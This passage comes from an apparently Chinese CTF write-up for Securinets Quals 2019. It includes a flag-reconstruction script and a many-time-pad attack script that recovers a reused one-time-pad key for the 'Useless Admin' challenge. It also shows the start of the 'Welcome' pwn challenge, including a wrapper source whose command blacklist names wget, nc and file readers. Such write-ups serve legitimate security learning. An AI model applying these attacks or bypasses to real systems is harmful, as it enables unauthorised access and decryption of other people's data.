class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pos</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(y)):</span><br><span class="line">        <span class="keyword">if</span> y[i] == x:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">table = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span></span><br><span class="line">enc = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line">enc[<span class="number">0</span>] = ord(table[<span class="number">28</span>])</span><br><span class="line">enc[<span class="number">3</span>] = ord(<span class="string">'j'</span>)</span><br><span class="line">enc[<span class="number">4</span>] = enc[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">enc[<span class="number">12</span>] = enc[<span class="number">4</span>] - <span class="number">1</span></span><br><span class="line">enc[<span class="number">22</span>] = enc[<span class="number">4</span>] - <span class="number">1</span></span><br><span class="line">enc[<span class="number">24</span>] = enc[<span class="number">4</span>] - <span class="number">1</span></span><br><span class="line">enc[<span class="number">1</span>] = ord(table[<span class="number">54</span>])</span><br><span class="line">enc[<span class="number">2</span>] = ord(table[((<span class="number">28</span> + pos(chr(enc[<span class="number">1</span>]), table)) &gt;&gt; <span class="number">2</span>) + <span class="number">1</span>])</span><br><span class="line">enc[<span class="number">10</span>] = enc[<span class="number">2</span>]</span><br><span class="line">enc[<span class="number">6</span>] = enc[<span class="number">3</span>] - <span class="number">32</span></span><br><span class="line">enc[<span class="number">7</span>] = ord(<span class="string">'p'</span>)</span><br><span class="line">enc[<span class="number">11</span>] = <span class="number">48</span></span><br><span class="line">enc[<span class="number">23</span>] = <span class="number">48</span></span><br><span class="line">enc[<span class="number">35</span>] = enc[<span class="number">11</span>] + <span class="number">9</span></span><br><span class="line">enc[<span class="number">8</span>] = enc[<span class="number">0</span>] - <span class="number">1</span></span><br><span class="line">enc[<span class="number">27</span>] = enc[<span class="number">4</span>] + <span class="number">2</span></span><br><span class="line">enc[<span class="number">31</span>] = enc[<span class="number">27</span>]</span><br><span class="line">enc[<span class="number">9</span>] = enc[<span class="number">27</span>] + <span class="number">7</span></span><br><span class="line">enc[<span class="number">25</span>] = enc[<span class="number">27</span>] + <span class="number">7</span></span><br><span class="line">enc[<span class="number">13</span>] = enc[<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">enc[<span class="number">17</span>] = enc[<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">enc[<span class="number">21</span>] = enc[<span class="number">1</span>] + <span class="number">1</span></span><br><span class="line">enc[<span class="number">15</span>] = enc[<span class="number">7</span>] + <span class="number">3</span></span><br><span class="line">enc[<span class="number">14</span>] = enc[<span class="number">15</span>] + <span class="number">1</span></span><br><span class="line">enc[<span class="number">19</span>] = ord(<span class="string">'z'</span>)</span><br><span class="line">enc[<span class="number">34</span>] = enc[<span class="number">0</span>] - <span class="number">33</span></span><br><span class="line">enc[<span class="number">5</span>] = <span class="number">88</span></span><br><span class="line">enc[<span class="number">20</span>] = <span class="number">88</span></span><br><span class="line">enc[<span class="number">29</span>] = <span class="number">88</span></span><br><span class="line">enc[<span class="number">33</span>] = <span class="number">88</span></span><br><span class="line">enc[<span class="number">26</span>] = <span class="number">49</span></span><br><span class="line">enc[<span class="number">16</span>] = enc[<span class="number">9</span>] - <span class="number">32</span></span><br><span class="line">enc[<span class="number">28</span>] = enc[<span class="number">16</span>]</span><br><span class="line">enc[<span class="number">18</span>] = enc[<span class="number">7</span>] - <span class="number">30</span></span><br><span class="line">enc[<span class="number">30</span>] = enc[<span class="number">18</span>]</span><br><span class="line">enc[<span class="number">32</span>] = enc[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    flag += chr(i)</span><br><span class="line">flag = base64.b64decode(flag)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag:'</span>, flag</span><br></pre></td></tr></table></figure>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="Useless-Admin"><a href="#Useless-Admin" class="headerlink" title="Useless Admin"></a>Useless Admin</h1><p>题目说明了是 OTP（一次一密），并且给了一个 json，里面有用同一个密钥加密的不同密文，以及同样被加密的 flag。</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"cipher_list"</span>: [</span><br><span class="line">    <span class="string">"1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940"</span>,</span><br><span class="line">    <span class="string">"1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f"</span>,</span><br><span class="line">    <span class="string">"1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d"</span>,</span><br><span class="line">    <span class="string">"160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f"</span>,</span><br><span class="line">    <span class="string">"1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c"</span>,</span><br><span class="line">    <span class="string">"1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e"</span>,</span><br><span class="line">    <span class="string">"1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347"</span>,</span><br><span class="line">    <span class="string">"0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42"</span>,</span><br><span class="line">    <span class="string">"160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542"</span>,</span><br><span class="line">    <span class="string">"1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b"</span>,</span><br><span class="line">    <span class="string">"1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40"</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"cipher_flag"</span>: <span class="string">"1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>同时我找到了一篇<a href="http://dann.com.br/alexctf2k17-crypto100-many_time_secrets/" target="_blank" rel="noopener">2017 年 AlexCTF 中类似的 writeup</a>，用的是 github 上的一个<a href="https://raw.githubusercontent.com/Jwomers/many-time-pad-attack/master/attack.py" target="_blank" rel="noopener">attack 脚本</a>。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span></span><br><span class="line"><span class="comment"># @author intrd - http://dann.com.br/</span></span><br><span class="line"><span class="comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> sets, sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span></span><br><span class="line">c1 = <span class="string">'1b0605000e14000d1b524802190b410700170e10054c11480807001806004e4f1f4f01480d411400531158141e1c100016535a480c000c031a000a160d421e004113010f13451e0c0100100a020a1a4e165f500d0c1e041a090b001d0515521c0a0410000a4f4b4d1d1c184d071600071c0a521d1706540940'</span></span><br><span class="line">c2 = <span class="string">'1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f0c8d4fc7520211531b0b0c1e4f'</span></span><br><span class="line">c3 = <span class="string">'1d0c04451352001a000154431b014109450a0a0b000045490403520a1d16490008535848085942071c0d0c57101c0045111c40430c4e111c0b1b1c451d4f071712010508475518061d00060a1b0a1a4c165d'</span></span><br><span class="line">c4 = <span class="string">'160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e164e1d060d0d44541a0041031b0b06540d1a070004001d4b074800531c04101d4f'</span></span><br><span class="line">c5 = <span class="string">'1a1d524912521548120045021b4e1506490a0859150345531d12521b4e094909030003011148420453074d161e05540b071e4c451b000a084a1d1c04084c0b45060b060a4742070618534218070210484512020043100e191e5956111a1c001c1f0b5c'</span></span><br><span class="line">c6 = <span class="string">'1a1d5248000154041a1c47430d0b04000005015900140c4f04534f094e08490103000000045442111b11001b1b1d000917535a48004e021d4a0e0b0044491c03080a001a024c11490748074f02040054451a1d150c1b150d020d0e'</span></span><br><span class="line">c7 = <span class="string">'1a1d5249125215481613500a1b0f0d4e4d0d1c0d000700001d1c001b06004f1d0f5a11480745040a011100181c0c540d13000e44085404404a061716014e010c0308104e084e0d4911450506011853540a5304120a1a154c0a1843001b45541c481607051b431f480d001e0400000c531d01011d00124441010200190d0800000000000e54060001100a1b4d0b040d105347'</span></span><br><span class="line">c8 = <span class="string">'0a0607000913020d551300041d0f0f0a0003061f154c034f1b53530602004e0c030c541f0454110a1d5a001e0649190419165d00104f104e1b1a101101001b0b1705051b0642040c5341114f0e4b104f0803110b0a060f42'</span></span><br><span class="line">c9 = <span class="string">'160d074300061d071b524e06190b134e450a0b0a4d4c12411d004f014045491b4649074804001100011d4504520612451e165d53064e16424a1810110c00060d04440e1c02411c0c00544209001953540d165009021a1542'</span></span><br><span class="line">c10 = <span class="string">'1e10524e001f11481c010010070b13024f0704590903094d0c000e4f0711000615001911454217161a1a45040149000a5218404f1e0012060b1b590a1048171741140c01174c0d49174f4201001f534b0b1c074b'</span></span><br><span class="line">c11 = <span class="string">'1a49134d4113540a0713490d434e160f541700174f4c11480c53520a1d1100000000190d4549114512544d12000c540402034b4e0d491d40'</span></span><br><span class="line">ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line"><span class="comment"># The target ciphertext we want to crack</span></span><br><span class="line">target_cipher = <span class="string">'1a4905410f06110c55064f430a00054e540c0a591603174c0d5f000d1b110006414c1848164516111f1100111d1b54001c17474e0e001c011f1d0a4b'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strxor</span><span class="params">(a, b)</span>:</span>     <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">""</span>.join([chr(ord(x) ^ ord(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> zip(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># To store the final key</span></span><br><span class="line">final_key = [<span class="keyword">None</span>]*<span class="number">300</span></span><br><span class="line"><span class="comment"># To store the positions we know are broken</span></span><br><span class="line">known_key_positions = set()</span><br><span class="line"></span><br><span class="line"><span class="comment"># For each ciphertext</span></span><br><span class="line"><span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> enumerate(ciphers):</span><br><span class="line">	counter = collections.Counter()</span><br><span class="line">	<span class="comment"># for each other ciphertext</span></span><br><span class="line">	<span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> enumerate(ciphers):</span><br><span class="line">		<span class="keyword">if</span> current_index != index: <span class="comment"># don't xor a ciphertext with itself</span></span><br><span class="line">			<span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> enumerate(strxor(ciphertext.decode(<span class="string">'hex'</span>), ciphertext2.decode(<span class="string">'hex'</span>))): <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">				<span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span></span><br><span class="line">				<span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span> <span class="comment"># Increment the counter at this index</span></span><br><span class="line">	knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">	<span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">		<span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">		<span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">	<span class="comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">	xor_with_spaces = strxor(ciphertext.decode(<span class="string">'hex'</span>),<span class="string">' '</span>*<span class="number">300</span>)</span><br><span class="line">	<span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">		<span class="comment"># Store the key's value at the correct position</span></span><br><span class="line">		final_key[index] = xor_with_spaces[index].encode(<span class="string">'hex'</span>)</span><br><span class="line">		<span class="comment"># Record that we known the key at this position</span></span><br><span class="line">		known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">final_key_hex = <span class="string">''</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span> <span class="keyword">else</span> <span class="string">'00'</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line"><span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">output = strxor(target_cipher.decode(<span class="string">'hex'</span>),final_key_hex.decode(<span class="string">'hex'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fix this sentence:"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">'*'</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> enumerate(output)])+<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WAIT.. MANUAL STEP HERE</span></span><br><span class="line"><span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line"><span class="comment"># fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"</span></span><br><span class="line"><span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line"><span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#target_plaintext = "cure, Let Me know if you a"</span></span><br><span class="line">target_plaintext = <span class="string">"i wanted to end the world, but i'll settle for ending yours."</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Fixed:"</span></span><br><span class="line"><span class="keyword">print</span> target_plaintext+<span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">key = strxor(target_cipher.decode(<span class="string">'hex'</span>),target_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Decrypted msg:"</span></span><br><span class="line"><span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">	<span class="keyword">print</span> strxor(cipher.decode(<span class="string">'hex'</span>),key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nPrivate key recovered: "</span>+key+<span class="string">"\n"</span></span><br></pre></td></tr></table></figure>
-<p>具体原理应该就是异或了，只需要想办法复原 key 即可。我还找到一个<a href="https://github.com/CameronLonsdale/MTP" target="_blank" rel="noopener">cli 工具</a>，让还原 key 更简单，截图如下：</p>
-<p><img src="/pics/2019-Securinets-CTF-Quals/3.png" alt="MTP工具"></p>
-<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>给了个 ssh，然后无法执行 welcome 以及查看 flag.txt：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/home/welcome</span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">welcome</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -al</span></span><br><span class="line">total 56</span><br><span class="line">dr-xr-xr-x   2 welcome         welcome          4096 Mar 23 20:23 .</span><br><span class="line">drwxr-xr-x  22 root            root             4096 Mar 24 10:18 ..</span><br><span class="line">-rw-r--r--   1 root            root                0 Mar 25 02:13 .bash_history</span><br><span class="line">-rw-r--r--   1 welcome         welcome             0 Mar 24 00:22 .bash_logout</span><br><span class="line">-rw-r--r--   1 welcome         welcome             1 Mar 24 13:33 .bashrc</span><br><span class="line">-rw-r--r--   1 welcome         welcome           655 May 16  2017 .profile</span><br><span class="line">-r--------   1 welcome-cracked welcome-cracked    76 Mar 23 20:23 flag.txt</span><br><span class="line">-r--------+  1 welcome-cracked welcome          8712 Mar 23 19:09 welcome</span><br><span class="line">-rw-r-----   1 root            root              175 Mar 23 12:27 welcome.c</span><br><span class="line">-r-s--x---   1 welcome-cracked welcome         13088 Mar 23 20:13 wrapper</span><br><span class="line">-rw-r--r--   1 root            root             1741 Mar 23 20:13 wrapper.c</span><br></pre></td></tr></table></figure>
-<p>wrapper 是可以执行的，源码也能查看，可以大致看看做了什么：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* author : Anis_Boss */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">char</span> str[], <span class="keyword">char</span> word[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l, i, j;</span><br><span class="line">    <span class="comment">/*length of word */</span></span><br><span class="line">   <span class="keyword">for</span> (l = <span class="number">0</span>; word[l] != <span class="string">'\0'</span>; l++);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>; str[i] != <span class="string">'\0'</span> &amp;&amp; word[j] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == word[j])</span><br><span class="line">        &#123;</span><br><span class="line">            j++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j == l)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* substring found */</span></span><br><span class="line">        <span class="keyword">return</span> (i - j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>  - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete_word</span><span class="params">(<span class="keyword">char</span> str[], <span class="keyword">char</span> word[], <span class="keyword">int</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, l;</span><br><span class="line">    <span class="comment">/* length of word */</span></span><br><span class="line">    <span class="keyword">for</span> (l = <span class="number">0</span>; word[l] != <span class="string">'\0'</span>; l++);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = index; str[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        str[i] = str[i + l + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> * blacklist[]=&#123;<span class="string">"cat"</span>,<span class="string">"head"</span>,<span class="string">"less"</span>,<span class="string">"more"</span>,<span class="string">"cp"</span>,<span class="string">"man"</span>,<span class="string">"scp"</span>,<span class="string">"xxd"</span>,<span class="string">"dd"</span>,<span class="string">"od"</span>,<span class="string">"python"</span>,<span class="string">"perl"</span>,<span class="string">"ruby"</span>,<span class="string">"tac"</span>,<span class="string">"rev"</span>,<span class="string">"xz"</span>,<span class="string">"tar"</span>,<span class="string">"zip"</span>,<span class="string">"gzip"</span>,<span class="string">"mv"</span>,<span class="string">"flag"</span>,<span class="string">"txt"</span>,<span class="string">"python"</span>,<span class="string">"perl"</span>,<span class="string">"vi"</span>,<span class="string">"vim"</span>,<span class="string">"nano"</span>,<span class="string">"pico"</span>,<span class="string">"awk"</span>,<span class="string">"grep"</span>,<span class="string">"egrep"</span>,<span class="string">"echo"</span>,<span class="string">"find"</span>,<span class="string">"exec"</span>,<span class="string">"eval"</span>,<span class="string">"regexp"</span>,<span class="string">"tail"</span>,<span class="string">"head"</span>,<span class="string">"less"</span>,<span class="string">"cut"</span>,<span class="string">"tr"</span>,<span class="string">"pg"</span>,<span class="string">"du"</span>,<span class="string">"`"</span>,<span class="string">"$"</span>,<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"#"</span>,<span class="string">"bzip2"</span>,<span class="string">"cmp"</span>,<span class="string">"split"</span>,<span class="string">"paste"</span>,<span class="string">"diff"</span>,<span class="string">"fgrep"</span>,<span class="string">"gawk"</span>,<span class="string">"iconv"</span>,<span class="string">"ln"</span>,<span class="string">"most"</span>,<span class="string">"open"</span>,<span class="string">"print"</span>,<span class="string">"read"</span>,<span class="string">"&#123;"</span>,<span class="string">"&#125;"</span>,<span class="string">"sort"</span>,<span class="string">"uniq"</span>,<span class="string">"tee"</span>,<span class="string">"wget"</span>,<span class="string">"nc"</span>,<span class="string">"hexdump"</span>,<span class="string">"HOSTTYPE"</span>,<span class="string">"$"</span>,<span class="string">"arch"</span>,<span class="string">"env"</span>,<span class="string">"tmp"</span>,<span class="string">"dev"</span>,<span class="string">"shm"</span>,<span class="string">"lock"</span>,<span class="string">"run"</span>,<span class="string">"var"</span>,<span class="string">"snap"</span>,<span class="string">"nano"</span>,<span class="string">"read"</span>,<span class="string">"readlink"</span>,<span class="string">"zcat"</span>,<span class="string">"tailf"</span>,<span class="string">"zcmp"</span>,<span class="string">"zdiff"</span>,<span class="string">"zegrep"</span>,<span class="string">"zdiff"</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">char</span> str[<span class="number">80</span>], word[<span class="number">50</span>];</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to Securinets Quals CTF \o/ \n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter string:\n"</span>);</span><br><span class="line">    read(<span class="number">0</span>,str,<span class="number">79</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(blacklist)/<span class="keyword">sizeof</span>(blacklist[<span class="number">0</span>]);i++)</span><br><span class="line">&#123;</span><br><span class="line">    index = search(str, blacklist[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index !=  - <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        delete_word(str, blacklist[i], index);</span><br><span 